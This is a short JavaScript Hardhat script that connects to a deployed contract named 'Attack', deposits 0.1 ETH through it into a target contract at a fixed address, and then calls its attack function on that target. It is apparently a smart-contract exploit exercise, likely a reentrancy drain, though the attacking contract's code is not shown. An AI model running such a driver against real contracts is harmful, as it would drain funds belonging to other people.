async function main() {
    const AMOUNT = ethers.parseEther("0.1"); //bignumber
    let att;
    const [owner] = await ethers.getSigners();
    att = await ethers.getContractAt(
      "Attack", 
      "0x4Ca2c430cB779709918C9220Ca9f97F4B47C2685", 
      owner
    );
    const txn1 = await att.depo("0x56291FDC3797267F94dbd21D6e4016D6C748393C",{value: AMOUNT});
    await txn1.wait(1);
    const txn2 = await att.attack("0x56291FDC3797267F94dbd21D6e4016D6C748393C");
    await txn2.wait(1);
  }
  
  main()
    .then(() => process.exit(0))
    .catch((error) => {
      console.error(error);
      process.exit(1);
    });

